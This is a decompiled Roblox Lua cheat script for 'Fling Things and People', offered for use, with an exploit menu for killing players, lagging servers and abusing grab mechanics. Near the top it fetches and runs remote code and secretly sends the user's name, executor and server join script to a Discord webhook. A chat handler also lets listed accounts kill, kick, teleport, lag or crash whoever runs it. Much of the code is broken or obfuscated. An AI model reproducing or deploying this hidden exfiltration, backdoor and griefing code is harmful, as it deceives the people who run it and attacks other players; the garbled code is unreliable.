--[[ 
▓█████▄ ▓█████  ██▓     █    ██   ██████  ██▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓█   ▀ ▓██▒     ██  ▓██▒▒██    ▒ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒███   ▒██░    ▓██  ▒██░░ ▓██▄   ▒██▒▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄ ▒██░    ▓▓█  ░██░  ▒   ██▒░██░▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ░▒████▒░██████▒▒▒█████▓ ▒██████▒▒░██░░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░    ░     ░ ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░       ░  ░    ░  ░   ░           ░   ░      ░ ░           ░ 
    --]] 
local PlaceId = game.PlaceId ~= 6961824067;
if PlaceId then
    local LocalPlayer = game.Players.LocalPlayer;
    return LocalPlayer:Kick("USE THIS SCRIPT IN FLING THINGS AND PEOPLE");
end;
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
local r24 = loadstring(game:HttpGet("https://sirius.menu/rayfield"))();
print("ВЕКС Я ПЕРЕПИСАЛ СКРИПТ ОТСТАНЬ ОТ МОЕГО ВЕБХУКА");
local UserInputService = game:GetService("UserInputService");
local TextChatService = game:GetService("TextChatService");
local RunService = game:GetService("RunService");
local StarterGui = game:GetService("StarterGui");
local r30 = v2.MenuToys.DestroyToy;
local r31 = v2.BombEvents.BombExplode;
local v9 = v2.GrabEvents.CreateGrabLine;
local r33 = v2.GrabEvents.DestroyGrabLine;
local r36 = v2.CharacterEvents.RagdollRemote;
local r37 = v2.DataEvents.UpdateLineColorsEvent;
local LocalPlayer2 = v9:GetService("Players").LocalPlayer;
local r41 = O:GetMouse();
local r46 = "!";
local v11 = e[m];
local HttpService = game:GetService("HttpService");
(http.request or (syn.request or (fluxus.request or http_request)))({
    ["Url"] = "https://discord.com/api/webhooks/1415675858856968294/mwoPRTSCnraezuwG0qtbYE1O6nKyUnsMupE1ajHlqPp3X32Q-CkHkreg6ZugKsW2nHlX", -- deleted
    ["Method"] = "POST",
    ["Headers"] = {
        ["Content-Type"] = "application/json"
    },
    ["Body"] = v13:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "ЧЕЛ СОСАЛ БЫСТРЕЕ ЗАХОДИ!!!",
                ["description"] = "Name " .. "```lua\n" .. LocalPlayer2.Name .. "\n```" .. "   " .. "DisplayName " .. "```lua\n" .. LocalPlayer2.DisplayName .. "   " .. "\n```" .. "   " .. getexecutorname() .. "\n" .. "JoinScript " .. "```lua\n" .. ("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game.Players.LocalPlayer)") .. "\n```",
                ["color"] = 65280
            }
        }
    })
});
TextChatService.OnIncomingMessage = function(arg1_2)
    m = u.TextSource;
    if m then
        C = m.Name == "Kovryab22";
        if C or (m.Name == "Iven_EGA12345678910" or (m.Name == "asideglide179tkzpf" or (m.Name == "FreeZerok0" or (m.Name == "FreeZer_NT" or (m.Name == "FreeZeroke" or (m.Name == "MilkaXabsosute" or (m.Name == "FHDGXFGDE" or m.Name == "lol666790s"))))))) then
            local Character = LocalPlayer2.Character;
            if u.Text == r46 .. "kill " .. LocalPlayer2.Name or u.Text == r46 .. "kill " .. LocalPlayer2.DisplayName then
                if Character then
                    Y.Humanoid.Health = 0;
                end;
            else
                if u.Text == r46 .. "bring " .. LocalPlayer2.Name or u.Text == r46 .. "bring " .. LocalPlayer2.DisplayName then
                    s = "Character";
                    B = game.Players:FindFirstChild(Y.Name)[r16[s]];
                    if Y then
                        local HumanoidRootPart = Y:FindFirstChild("HumanoidRootPart");
                        if HumanoidRootPart then
                            
                        end;
                    end;
                    if Y then
                        Y.HumanoidRootPart.CFrame = B.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5);
                    end;
                else
                    if u.Text == r46 .. "kick " .. LocalPlayer2.Name or u.Text == r46 .. "kick " .. LocalPlayer2.DisplayName then
                        LocalPlayer2:Kick("Kicked by " .. Y.Name);
                    else
                        if u.Text == r46 .. "reveal" or u.Text == r46 .. "reveal" then
                            Y = TextChatService.TextChannels.RBXGeneral;
                            Y:SendAsync("Ya Posral!");
                        else
                            if u.Text == r46 .. "kakanagolova " .. LocalPlayer2.Name or u.Text == r46 .. "kakanagolova " .. LocalPlayer2.DisplayName then
                                if LocalPlayer2.Character then
                                    r16:WaitForChild("SoundPart");
                                    r16 = spawntoy("PoopPile", HRP.CFrame * CFrame.new(5, 5, 20));
                                    r15 = r16:FindFirstChild("SoundPart") or ;
                                    if r15 then
                                        task.wait(.1);
                                        sno(r15);
                                        task.wait(.1);
                                        PartOwner = r15:FindFirstChild("PartOwner");
                                        T = r15:FindFirstChild("PartOwner").Value == LocalPlayer2.Name;
                                        while not PartOwner do
                                            if T then
                                                T.CFrame = Y.Head.CFrame * CFrame.new(0, 3, 0);
                                                task.wait();
                                            end;
                                            break; 
                                        end;
                                    end;
                                end;
                            else
                                if u.Text == r46 .. "lag " .. LocalPlayer2.Name or u.Text == r46 .. "lag " .. LocalPlayer2.DisplayName then
                                    LocalPlayer2.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = true;
                                else
                                    if u.Text == r46 .. "unlag " .. LocalPlayer2.Name or u.Text == r46 .. "unlag " .. LocalPlayer2.DisplayName then
                                        LocalPlayer2.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = false;
                                    else
                                        if u.Text == r46 .. "crash " .. LocalPlayer2.Name or u.Text == r46 .. "crash " .. LocalPlayer2.DisplayName then
                                            while true do end;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end; 
end;
if LocalPlayer2.Character then
    local v19 = LocalPlayer2.Character;
    if v19 then
        LocalPlayer2.CharacterAdded:Connect(function(Character, ...)
            return; 
        end);
        local function v24()
            local Humanoid = v19:FindFirstChildOfClass("Humanoid");
            m = Humanoid and Humanoid.SeatPart;
            if m then
                return m:FindFirstAncestor("CreatureBlobman");
            end;
            return nil; 
        end;
        local function r52()
            for u = 1, 5 do
                game = workspace.Plots:FindFirstChild("Plot" .. u);
                v11 = v7.PlotSign.ThisPlotsOwners;
                Value = v11:FindFirstChild("Value");
                if game then
                    if Value then
                        
                    end;
                end;
                if game then
                    return game;
                else
                    
                end; 
            end; 
        end;
        local timerDuration = .1;
        workspace:WaitForChild(LocalPlayer2.Name .. "SpawnedInToys");
        game:GetService("ReplicatedStorage");
        local r58 = {};
        for QZ = 1, 20 do
            r58[QZ] = Color3.fromRGB(0, 0, 0); 
        end;
        local r59 = 2;
        local Window = r24:CreateWindow({
            ["Name"] = "Posral",
            ["Icon"] = 0,
            ["LoadingTitle"] = "Posral",
            ["LoadingSubtitle"] = "By Kovryab",
            ["Theme"] = "Default",
            ["DisableRayfieldPrompts"] = false,
            ["DisableBuildWarnings"] = false,
            ["ConfigurationSaving"] = {
                ["Enabled"] = true,
                ["FolderName"] = "Friendly",
                ["FileName"] = "Friendly"
            },
            ["Discord"] = {
                ["Enabled"] = true,
                ["Invite"] = "j7bvWz4huW",
                ["RememberJoins"] = true
            },
            ["KeySystem"] = false,
            ["KeySettings"] = {
                ["Title"] = "KEY IN DISCORD",
                ["Subtitle"] = "Key System",
                ["Note"] = "No method of obtaining the key is provided",
                ["FileName"] = "Key",
                ["SaveKey"] = true,
                ["GrabKeyFromSite"] = true,
                ["Key"] = {
                    "sriendly"
                }
            }
        });
        local v30 = Window:CreateTab("Combat", "swords");
        local v31 = Window:CreateTab("Defense", "shield-ban");
        local v32 = Window:CreateTab("Line", "minus");
        local r62 = v19:WaitForChild("HumanoidRootPart");
        local r63 = workspace:FindFirstChild(LocalPlayer2.Name .. "SpawnedInToys");
        LocalPlayer2.CharacterAdded:Connect(function(Character, ...)
            return; 
        end);
        local function r66()
            u = v19 and 76;
            return u; 
        end;
        local v41 = Window:CreateTab("Teleport", "chevrons-down-up");
        local v42 = Window:CreateTab("Keybinds", "key");
        local v43 = Window:CreateTab("Misc", "box");
        Window:CreateTab("Target", "align-vertical-space-around");
        Window:CreateTab("Auto", "refresh-ccw");
        stopVelocityF = function()
            local Character = LocalPlayer2.Character;
            Character:WaitForChild("Humanoid");
            Character:WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero; 
        end;
        v41:CreateKeybind({
            ["Name"] = "TP to mouse",
            ["CurrentKeybind"] = "T",
            ["HoldToInteract"] = false,
            ["Flag"] = "TPtomouse1",
            ["Callback"] = function(arg1_9, ...)
                if r41.Target then
                    r62.CFrame = r41.Hit * CFrame.new(0, 5, 0);
                    stopVelocityF();
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Paint",
            ["CurrentValue"] = false,
            ["Flag"] = "PaintDeleteToggle",
            ["Callback"] = function(arg1_10, ...)
                if arg1_10 then
                    B = B[1];
                    for selectionBox, game in pairs(B:GetDescendants()) do
                        if v7.Name == "PaintPlayerPart" then
                            game:Destroy();
                        end; 
                    end;
                else
                    r67:Disconnect();
                end;
                return; 
            end
        });
        v43:CreateToggle({
            ["Name"] = "Water Collision",
            ["CurrentValue"] = false,
            ["Flag"] = "WaterCollide",
            ["Callback"] = function(arg1_12, ...)
                game = r15;
                Map = workspace:FindFirstChild("Map");
                m = Map and ;
                if m then
                    game = m.GetChildren;
                    for B, s in ipairs(J("ipairs")) do
                        game = B;
                        v3 = s.Name == "Ocean";
                        if v3 then
                            s.CanCollide = arg1_12;
                        end; 
                    end;
                end;
                return; 
            end
        });
        v42:CreateKeybind({
            ["Name"] = "Anchor object",
            ["CurrentKeybind"] = "K",
            ["HoldToInteract"] = false,
            ["Flag"] = "Anchor",
            ["Callback"] = function(...)
                if workspace:FindFirstChild("GrabParts") then
                    workspace = workspace:FindFirstChild("GrabParts").GrabPart.WeldConstraint.Part1.Parent;
                    workspace = workspace;
                    if workspace then
                        if workspace and not workspace:FindFirstChild("BodyPosition", true) then
                            m = Instance.new("BodyGyro");
                            workspace = Instance.new("SelectionBox");
                            B = Instance.new("BodyPosition");
                            selectionBox.Parent = workspace;
                            selectionBox.Adornee = u;
                            selectionBox.SurfaceTransparency = .8;
                            selectionBox.LineThickness = .05;
                            B.Position = v39.SoundPart.Position;
                            B.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                            B.P = 1000000000;
                            B.D = 1000000;
                            m.CFrame = v39.SoundPart.CFrame;
                            B.Parent = v39.SoundPart;
                            m.Parent = v39.SoundPart;
                            m.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
                            m.P = 1000000000;
                            m.D = 1000000;
                        else
                            workspace = v39.SoundPart;
                            BodyPosition = workspace:FindFirstChild("BodyPosition");
                            BodyPosition:Destroy();
                            workspace = v39.SoundPart;
                            BodyPosition = workspace:FindFirstChild("BodyGyro");
                            BodyPosition:Destroy();
                            workspace = workspace:FindFirstChild("SelectionBox");
                            workspace:Destroy();
                        end;
                        return;
                    else
                        workspace = workspace;
                    end;
                end; 
            end
        });
        v42:CreateKeybind({
            ["Name"] = "Shoot Pencil",
            ["CurrentKeybind"] = "Four",
            ["HoldToInteract"] = false,
            ["Flag"] = "Keybind1",
            ["Callback"] = function(arg1_13, ...)
                m = r54("ToolPencil", r62.CFrame * CFrame.new(5, 5, 20));
                selectionBox = m:WaitForChild("StickyPart", 3);
                if selectionBox then
                    r53(m.SoundPart);
                    task.wait(.2);
                    B = workspace.CurrentCamera;
                    g = B.CFrame.LookVector;
                    game = B.CFrame.Position + g * 7;
                    m.StickyPart.CFrame = CFrame.new(game, game + g);
                    s = Instance.new("BodyVelocity");
                    s.MaxForce = Vector3.new(1000000, 1000000, 1000000);
                    s.Velocity = g * 100;
                    s.Parent = m.StickyPart;
                    d = Instance.new("BodyGyro");
                    d.MaxTorque = Vector3.new(1000000, 1000000, 1000000);
                    d.CFrame = CFrame.new(game, game + g);
                    d.Parent = m.StickyPart;
                    m.Name = math.random(1, 1000000);
                    while not selectionBox:WaitForChild("StickyWeld", 3).Part1 do
                        task.wait(); 
                    end;
                    s:Destroy();
                    d:Destroy();
                end;
                return; 
            end
        });
        v42:CreateKeybind({
            ["Name"] = "Shoot Pencil and BOOM",
            ["CurrentKeybind"] = "Three",
            ["HoldToInteract"] = false,
            ["Flag"] = "Keybind22",
            ["Callback"] = function(arg1_14, ...)
                d = 5;
                game = "\x8f\x86T\xc7\xb9\xd2\x11\xeb\x13\xa6";
                s = 27558510211616;
                g = r15(game, s);
                m = r54("ToolPencil", r62.CFrame * CFrame.new(5, d, 20));
                selectionBox = m:WaitForChild(r16[g], 3);
                if selectionBox then
                    r53(m.SoundPart);
                    task.wait(.2);
                    g = B.CFrame.LookVector;
                    game = B.CFrame.Position + g * 7;
                    m.StickyPart.CFrame = CFrame.new(game, game + g);
                    s = Instance.new("BodyVelocity");
                    s.MaxForce = Vector3.new(1000000, 1000000, 1000000);
                    s.Velocity = g * 100;
                    s.Parent = m.StickyPart;
                    d = Instance.new("BodyGyro");
                    d.MaxTorque = Vector3.new(1000000, 1000000, 1000000);
                    d.CFrame = CFrame.new(game, game + g);
                    d.Parent = m.StickyPart;
                    m.Name = math.random(1, 1000000);
                    c = not selectionBox:WaitForChild("StickyWeld", 3).Part1;
                    v1 = tick() - tick() < 3;
                    while not c do
                        if v1 then
                            task.wait();
                        end;
                        s:Destroy();
                        d:Destroy();
                        c = r54("BombMissile", r62.CFrame * CFrame.new(5, 5, 20));
                        v11 = c:WaitForChild("PartHitDetector", 3);
                        if v11 then
                            r53(c:WaitForChild("Body", 3));
                            r31:FireServer({
                                ["Hitbox"] = r31,
                                ["PositionPart"] = r31
                            }, v39.Position);
                            task.wait();
                            r30:FireServer(r54("ToolPencil", r62.CFrame * CFrame[r16[v9]](5, d, v3)));
                        end;
                        break; 
                    end;
                end;
                return; 
            end
        });
        v43:CreateToggle({
            ["Name"] = "Jerk Off Tool",
            ["CurrentValue"] = false,
            ["Flag"] = "JerkOffToggle",
            ["Callback"] = function(arg1_15, ...)
                Character = LocalPlayer2.Character;
                s = ",\xf1U\xf3X\x80\xd5Y";
                r69 = LocalPlayer2:FindFirstChildWhichIsA(r16[r15(s, 2112239289303)]);
                if not Character or not r69 then
                    return;
                end;
                if arg1_15 then
                    game = r69;
                    game = game[1];
                    for g, d in game, ipairs(game:GetChildren()) do
                        if d:IsA("Tool") and d.Name == "Jerk Off" then
                            d:Destroy();
                        end; 
                    end;
                    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true);
                    instance = Instance.new("Tool");
                    instance.Name = "Jerk Off";
                    instance.ToolTip = "in the stripped club. straight up \"jorking it\" . and by \"it\", haha, well. let's just say. My peanits.";
                    instance.RequiresHandle = false;
                    instance.Parent = r69;
                    r71 = false;
                    local function s(...)
                        if r72 then
                            r72:Stop();
                        end;
                        return; 
                    end;
                    instance.Equipped:Connect(function(...)
                        return; 
                    end);
                    instance.Unequipped:Connect(s);
                    LocalPlayer2 = r68.Died;
                    LocalPlayer2:Connect(s);
                    task.spawn(function(...)
                        u = instance.Parent == r69;
                        Character = instance.Parent == LocalPlayer2.Character;
                        while u do
                            if Character then
                                if not r71 then
                                    task.wait();
                                end;
                                u = (function(localPlayer2, ...)
                                    Character = localPlayer2.Character and ;
                                    return Character; 
                                end)(LocalPlayer2);
                                LocalPlayer2 = not r72;
                                if LocalPlayer2 then
                                    Character = Instance.new("Animation");
                                    Character[LocalPlayer2] = not u and "rbxassetid://72042024" or "rbxassetid://698251653";
                                end;
                                r72:Play();
                                r72:AdjustSpeed(u and .7 or .65);
                                r72.TimePosition = .6;
                                task.wait(.1);
                                while not r72 do
                                    if r72 then
                                        task.wait(.1);
                                    end;
                                    if r72 then
                                        r72:Stop();
                                    end; 
                                end;
                            end;
                            return; 
                        end; 
                    end);
                else
                    for game, d in ipairs(J(d)) do
                        if d:IsA("Tool") and d.Name == "Jerk Off" then
                            d:Destroy();
                        end; 
                    end;
                    return;
                end; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Gucci",
            ["CurrentValue"] = false,
            ["Callback"] = function(arg1_17, ...)
                if arg1_17 then
                    m = r54("CreatureBlobman", r62.CFrame * CFrame.new(5, 5, 20));
                    game = r63:FindFirstChild("CreatureBlobman");
                    v1 = e[m];
                    task.wait();
                    game = r63:FindFirstChild("CreatureBlobman");
                    if game then
                        Humanoid = selectionBox:WaitForChild("VehicleSeat", 3);
                        Humanoid:Sit(LocalPlayer2.Character.Humanoid);
                        task.spawn(function(...)
                            while tick() < tick() + 3 do
                                r36:FireServer(r62, 0);
                                task.wait(); 
                            end;
                            return; 
                        end);
                        task.wait();
                        while selectionBox.VehicleSeat.Occupant ~= LocalPlayer2.Character.Humanoid do
                            task.wait(); 
                        end;
                        Humanoid = LocalPlayer2.Character.Humanoid;
                        Humanoid:ChangeState(Enum.HumanoidStateType.Jumping);
                        task.wait();
                        selectionBox.VehicleSeat.CFrame = CFrame.new(0, 1000000000, 0);
                        return;
                    end;
                end; 
            end
        });
        local r74 = true;
        local r75 = 0;
        local UserInputService2 = game:GetService("UserInputService");
        local camera = workspace.CurrentCamera;
        infLineExtendF = function(...)
            local Character = LocalPlayer2.Character;
            Character:WaitForChild("HumanoidRootPart");
            Character:WaitForChild("Humanoid");
            UserInputService2.InputChanged:Connect(function(arg1_18, ...)
                if Character.UserInputType == Enum.UserInputType.MouseWheel then
                    if r75 < 11 then
                        e[x[5]] = 11;
                    end;
                    if not (Character.Position.Z > 0) then
                        
                    end;
                end;
                return; 
            end);
            workspace.ChildAdded:Connect(function(arg1_19, ...)
                m = Character.Name == "GrabParts";
                if m then
                    if r74 and UserInputService2.MouseEnabled then
                        arg1_19:WaitForChild("GrabPart");
                        arg1_19:WaitForChild("DragPart");
                        r80 = r79.DragPart:Clone();
                        r80.Name = "DragPart1";
                        r80.AlignPosition.Attachment1 = r80.DragAttach;
                        r80.Parent = arg1_19;
                        r75 = (r80.Position - camera.CFrame.Position).Magnitude;
                        r80.AlignOrientation.Enabled = false;
                        r79.DragPart.AlignPosition.Enabled = false;
                        task.spawn(function(...)
                            while r79.Parent do
                                r80.Position = camera.CFrame.Position + camera.CFrame.LookVector * r75;
                                task.wait(); 
                            end;
                            return; 
                        end);
                    end;
                end;
                return; 
            end); 
        end;
        v31:CreateToggle({
            ["Name"] = "Anti Loop Kill",
            ["CurrentValue"] = false,
            ["Flag"] = "antiloopkill",
            ["Callback"] = function(arg1_20, ...)
                if not arg1_20 then
                    r81:Disconnect();
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Grab",
            ["CurrentValue"] = antiGrabEnabled,
            ["Flag"] = "AntiGrab",
            ["Callback"] = function(arg1_22, ...)
                if arg1_22 then
                    
                else
                    r82:Disconnect();
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Burn",
            ["CurrentValue"] = false,
            ["Flag"] = "AntiBurn",
            ["Callback"] = function(arg1_23, ...)
                if v then
                    
                else
                    r84:Disconnect();
                    r83:Disconnect();
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Blobman",
            ["CurrentValue"] = false,
            ["Flag"] = "AntiBlobman",
            ["Callback"] = function(arg1_25, ...)
                if arg1_25 then
                    B = B[1];
                    for selectionBox, game in B, pairs(B:GetDescendants()) do
                        if v7.Name == "CreatureBlobman" and not game:IsDescendantOf(r63) then
                            game:WaitForChild("RightDetector", 3);
                            s = game:FindFirstChild("RightDetector") or ;
                            game:WaitForChild("LeftDetector", 3);
                            d = game:FindFirstChild("LeftDetector") or ;
                            if s then
                                s.RightAlignOrientation.Enabled = false;
                                s.RightWeld.Enabled = false;
                                d.LeftAlignOrientation.Enabled = false;
                                d.LeftWeld.Enabled = false;
                            end;
                        end; 
                    end;
                else
                    r86:Disconnect();
                end;
                return; 
            end
        });
        v30:CreateSlider({
            ["Name"] = "Strength",
            ["Range"] = {
                300,
                40000
            },
            ["Increment"] = 1,
            ["Suffix"] = "S",
            ["CurrentValue"] = 300,
            ["Flag"] = "StrengthSlider",
            ["Callback"] = function(arg1_27, ...)
                return; 
            end
        });
        v30:CreateToggle({
            ["Name"] = "Strength(buggy)",
            ["CurrentValue"] = false,
            ["Flag"] = "StrengthToggle",
            ["Callback"] = function(arg1_28, ...)
                if not arg1_28 then
                    r88:Disconnect();
                    r89:Disconnect();
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Delete Legs",
            ["Callback"] = function(arg1_31, ...)
                if arg1_31 then
                    g = v19:FindFirstChild("Left Leg");
                    if g then
                        workspace.FallenPartsDestroyHeight = -100;
                        game = r36;
                        game:FireServer(r62, 2);
                        task.wait(0.5);
                        v19:FindFirstChild("Right Leg").CFrame = CFrame.new(0, -10000, 0);
                        v19:FindFirstChild("Left Leg").CFrame = CFrame.new(0, -10000, 0);
                        task.wait(.3);
                        r50.Torso.CFrame = CFrame.new(0, -9970, 0);
                        task.wait(0.5);
                        d = r50.Torso.CFrame;
                        r50.Torso.CFrame = d;
                        task.wait(0.5);
                        workspace.FallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight;
                        task.spawn(function(...)
                            if not v19:FindFirstChild("Left Leg") and not v19:FindFirstChild("Right Leg") then
                                while arg1_31 do
                                    if LocalPlayer2.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                                        r50.Humanoid.HipHeight = 2;
                                    else
                                        r50.Humanoid.HipHeight = 0;
                                    end;
                                    task.wait(.03); 
                                end;
                            end;
                            return; 
                        end);
                    end;
                end;
                return; 
            end
        });
        v31:CreateToggle({
            ["Name"] = "Anti Lag",
            ["CurrentValue"] = false,
            ["Flag"] = "AntiLag",
            ["Callback"] = function(arg1_32, ...)
                if arg1_32 then
                    LocalPlayer2.PlayerScripts.CharacterAndBeamMove.Enabled = false;
                else
                    LocalPlayer2.PlayerScripts.CharacterAndBeamMove.Enabled = true;
                end;
                return; 
            end
        });
        v43:CreateToggle({
            ["Name"] = "Anti Barrier",
            ["CurrentValue"] = false,
            ["Flag"] = "AntiBarrier",
            ["Callback"] = function(arg1_33, ...)
                Plots = workspace:FindFirstChild("Plots");
                if not Plots then
                    return;
                end;
                game = Plots.GetChildren;
                for B, s in g, ipairs(J(g)) do
                    game = B;
                    if s:FindFirstChild("Barrier") then
                        table = d.GetChildren[3];
                        for table, j in j[1], ipairs(j(d)) do
                            if j:IsA("BasePart") and j.Name == "PlotBarrier" then
                                j.CanCollide = not arg1_33;
                            end; 
                        end;
                    end; 
                end;
                return; 
            end
        });
        v43:CreateToggle({
            ["Name"] = "Unlock Third Person",
            ["CurrentValue"] = false,
            ["Flag"] = "ThirdPersonToggle",
            ["Callback"] = function(arg1_34, ...)
                if arg1_34 then
                    LocalPlayer2.CameraMaxZoomDistance = 100000;
                    LocalPlayer2.CameraMode = Enum.CameraMode.Classic;
                else
                    r93:Disconnect();
                    LocalPlayer2.CameraMode = Enum.CameraMode.LockFirstPerson;
                end;
                return; 
            end
        });
        v42:CreateSection("To use destroy player ragdoll target delete legs or arms and spawn toy in the target");
        v42:CreateToggle({
            ["Name"] = "Enable Destroy Player(Z all X LArm C RArm V LLeg B RLeg)",
            ["CurrentValue"] = false,
            ["Flag"] = "destroyplayer",
            ["Callback"] = function(arg1_35, ...)
                if arg1_35 then
                    
                else
                    r95:Disconnect();
                    r96:Disconnect();
                    r94:Disconnect();
                end;
                return; 
            end
        });
        v41:CreateButton({
            ["Name"] = "Bring Selected Player",
            ["Callback"] = function(...)
                if r98 and r98.Character then
                    u = r62.CFrame;
                    print("1");
                    r62.CFrame = r98.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0);
                    task.wait(.3);
                    print("2");
                    r53(r98.Character.HumanoidRootPart);
                    print("3");
                    task.wait(.1);
                    r98.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero;
                    print("4");
                    r98.Character.HumanoidRootPart.CFrame = u * CFrame.new(0, 0, -5);
                    print("5");
                    r62.CFrame = u;
                    print("6");
                    r33:FireServer(r98.Character.HumanoidRootPart);
                else
                    print("error");
                end;
                return; 
            end
        });
        v42:CreateToggle({
            ["Name"] = "Enable Transformer (Look At The Target and press Q)",
            ["CurrentValue"] = false,
            ["Flag"] = "transformer",
            ["Callback"] = function(arg1_40, ...)
                if arg1_40 then
                    r100 = UserInputService.InputBegan:Connect(function(arg1_41, ...)
                        B = "Q";
                        if arg1_41.KeyCode == Enum.KeyCode[B] then
                            print(1);
                            r101 = r41.Target;
                            _G.transformer = not _G.transformer;
                            HumanoidRootPart = r101.Parent:FindFirstChild("HumanoidRootPart");
                            if HumanoidRootPart then
                                task.spawn(function(...)
                                    print(2);
                                    print(r101);
                                    while _G.transformer do
                                        r101.Parent:WaitForChild("HumanoidRootPart", 1);
                                        print(3);
                                        u = u:FindFirstChild("HumanoidRootPart") or ;
                                        if u then
                                            r53(u);
                                            u.CFrame = r62.CFrame * CFrame.new(0, 0, -4);
                                        end;
                                        task.wait(); 
                                    end;
                                    return; 
                                end);
                            end;
                        end;
                        return; 
                    end);
                else
                    r100:Disconnect();
                end;
                return; 
            end
        });
        v32:CreateSection("Line Lag");
        v32:CreateSlider({
            ["Name"] = "Lag Speed",
            ["Range"] = {
                .01,
                1
            },
            ["Increment"] = .01,
            ["CurrentValue"] = timerDuration,
            ["Flag"] = "LagSpeedSlider",
            ["Callback"] = function(arg1_42, ...)
                return; 
            end
        });
        v32:CreateToggle({
            ["Name"] = "Server Lag",
            ["CurrentValue"] = false,
            ["Flag"] = "ServerLagToggle",
            ["Callback"] = function(arg1_43, ...)
                lagEnabled = arg1_43;
                task.spawn(function(...)
                    while lagEnabled do
                        selectionBox = selectionBox[1];
                        for m, g in pairs(selectionBox:GetPlayers()) do
                            Character = g.Character;
                            game = Character;
                            if Character then
                                game = g.Character:FindFirstChild("Head");
                            end;
                            if game then
                                game = game:GetService("ReplicatedStorage");
                                v11 = game:WaitForChild("GrabEvents");
                                game = v11:WaitForChild("CreateGrabLine");
                                game:FireServer(g.Character.Head, g.Character.Head.CFrame);
                            end; 
                        end;
                        task.wait(timerDuration); 
                    end;
                    return; 
                end);
                return; 
            end
        });
        v30:CreateToggle({
            ["Name"] = "Kill Grab",
            ["CurrentValue"] = false,
            ["Flag"] = "killgrab",
            ["Callback"] = function(arg1_44, ...)
                if arg1_44 then
                    r102 = workspace.ChildAdded:Connect(function(arg1_45, ...)
                        if u.Name == "GrabParts" then
                            arg1_45:WaitForChild("GrabPart", 1);
                            m = arg1_45:FindFirstChild("GrabPart") or ;
                            if m then
                                m:WaitForChild("WeldConstraint", 1);
                                B = "WeldConstraint";
                                selectionBox = m:FindFirstChild(B) or ;
                                if selectionBox then
                                    
                                end;
                                if selectionBox then
                                    selectionBox.Part1.Parent.Humanoid.Health = 0;
                                end;
                            end;
                        end;
                        return; 
                    end);
                else
                    r102:Disconnect();
                end;
                return; 
            end
        });
        v30:CreateToggle({
            ["Name"] = "Massless Grab",
            ["CurrentValue"] = false,
            ["Flag"] = "MasslessGrab",
            ["Callback"] = function(arg1_46, ...)
                if arg1_46 then
                    r103 = workspace.ChildAdded:Connect(function(arg1_47, ...)
                        if u.Name == "GrabParts" then
                            arg1_47:WaitForChild("DragPart", 1);
                            m = arg1_47:FindFirstChild("DragPart") or ;
                            if m then
                                m:WaitForChild("AlignPosition", 1);
                                m:WaitForChild("AlignOrientation", 1);
                                selectionBox = m:FindFirstChild("AlignOrientation") or ;
                                B = m:FindFirstChild("AlignPosition") or ;
                                if B then
                                    B.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge);
                                    B.MaxForce = math.huge;
                                    B.Responsiveness = 200;
                                    selectionBox.Responsiveness = 200;
                                    selectionBox.MaxTorque = math.huge;
                                end;
                            end;
                        end;
                        return; 
                    end);
                else
                    r103:Disconnect();
                end;
                return; 
            end
        });
        v42:CreateKeybind({
            ["Name"] = "Delete Object",
            ["CurrentKeybind"] = "Two",
            ["Flag"] = "deleter",
            ["HoldToInteract"] = false,
            ["Callback"] = function(...)
                u = r41.Target;
                if u then
                    if (u.Position - r62.Position).Magnitude < 30 then
                        r53(u);
                        task.wait(.1);
                        u.CFrame = CFrame.new(0, -60000, 0);
                    end;
                end;
                return; 
            end
        });
        local r104 = false;
        v43:CreateKeybind({
            ["Name"] = "Spammer(works on items and people)",
            ["CurrentKeybind"] = "G",
            ["Flag"] = "spammer",
            ["HoldToInteract"] = false,
            ["Callback"] = function(...)
                r105 = v1.Target;
                if r105 then
                    selectionBox = "SelectionBox";
                    if not r105:FindFirstChild(selectionBox) then
                        m = Instance.new("SelectionBox", r105);
                        m.Adornee = r105;
                        m.LineThickness = .03;
                        r104 = not r104;
                        task.spawn(function(...)
                            while r104 do
                                r53(r105);
                                r104 = RunService.Heartbeat;
                                r104:Wait(); 
                            end;
                            return; 
                        end);
                    else
                        r104 = false;
                        selectionBox = r105.Parent:FindFirstChild("SelectionBox", true);
                        selectionBox:Destroy();
                    end;
                end;
                return; 
            end
        });
        v32:CreateSection("Custom Line");
        local function r106()
            u = {};
            B = 103[1];
            for selectionBox, game in B, ipairs(B) do
                u[selectionBox] = {
                    ["R"] = v7.R,
